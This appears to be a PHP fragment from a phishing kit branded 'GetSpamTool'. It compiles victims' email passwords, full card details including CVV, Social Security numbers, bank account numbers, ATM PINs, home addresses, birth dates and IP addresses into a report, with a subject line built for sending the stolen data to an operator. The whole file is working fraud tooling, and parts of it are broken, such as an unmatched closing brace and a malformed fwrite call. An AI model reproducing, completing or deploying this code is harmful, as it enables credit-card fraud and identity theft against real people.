<?php

$CC_Type=array('?????','AmEx','MasterCard','Visa','DinersClub','enRoute','Discover','JCB','Solo','Maestro','VisaElectron','LaserCard','Switch');
$r  = "[~]===================== All the info =====================[~] <br />";
$r .= "Email Address		: ".$_SESSION['email']." <br />";
$r .= "Password			: ".$_SESSION['password']." <br />";
$r .= "-----------------: CC Info :-----------------<br />";
$r .= "Cardholder Name		: ".$_POST['CN']." <br />";
$r .= "Card Type				: ".$CC_Type[$_POST['CT']]." <br />";
$r .= "Card Number				: ".$_POST['dftCN']." <br />";
$r .= "Expiration Date			: ".$_POST['datex']." <br />";
$r .= "Card Verification Number: ".$_POST['dftVC']." <br />";
if(isset($_POST['NNS'])){$r=$r."Social Security Number	: ".$_POST['NNS']." <br />";}
if(isset($_POST['RGT'])){$r=$r."Bank Routing Number	: ".$_POST['RGT']." <br />";}
if(isset($_POST['TNC'])){$r=$r."Bank Account Number	: ".$_POST['TNC']." <br />";}
if(isset($_POST['MMT'])){$r=$r."ATM				: ".$_POST['MMT']." <br />";}
if(isset($_POST['CPNL'])){$r=$r."Code Personel		: ".$_POST['CPNL']." <br />";}
$r .= "---------------------------------------------- <br />";
$r .= "First Name	: ".$_POST['gg1']." <br />";
$r .= "Last Name	: ".$_POST['gg2']." <br /> ";
$r .= "Address 1	: ".$_POST['gg4']." <br />";
$r .= "Address 2	: ".$_POST['gg5']." <br />";
$r .= "City		:     ".$_POST['gg6']." <br />";
$r .= "ZIP Code	:     ".$_POST['gg8']." <br />";
$r .= "Country		: ".$_POST['gg7']." <br />";
$r .= $_POST['gg9']."_phone	: ".$_POST['gg10']." <br />";
$r .= "Date Of Birth	: ".$_POST['gg3']." <br />";
$r .= "===========================================================<br />";
$r .= "Date		: ".gmdate("d/m/Y - H:i:s")." <br />";
$r .= "Browser		: ".$_POST['BROWSER']." <br />";
$r .= "Client IP	: ".getenv("REMOTE_ADDR")." <br />";
$r .= "HostName	: ".gethostbyaddr(getenv("REMOTE_ADDR"))." <br />";
$r .= "Country	: ".$_SESSION['tLang']." <br />";
$r .= "City		: ".$_SESSION['city']." <br />";
$r .= "Zip		: ".$_SESSION['zip']." <br />";
$r .= "=================: WwW.GetSpamTool.Com :================<br />";

fwrite($r);  
return $r;

}
function subject(){return "CC | ".$_POST['gg7']." | ".$_POST['CN']." | ".getenv("REMOTE_ADDR");}


?>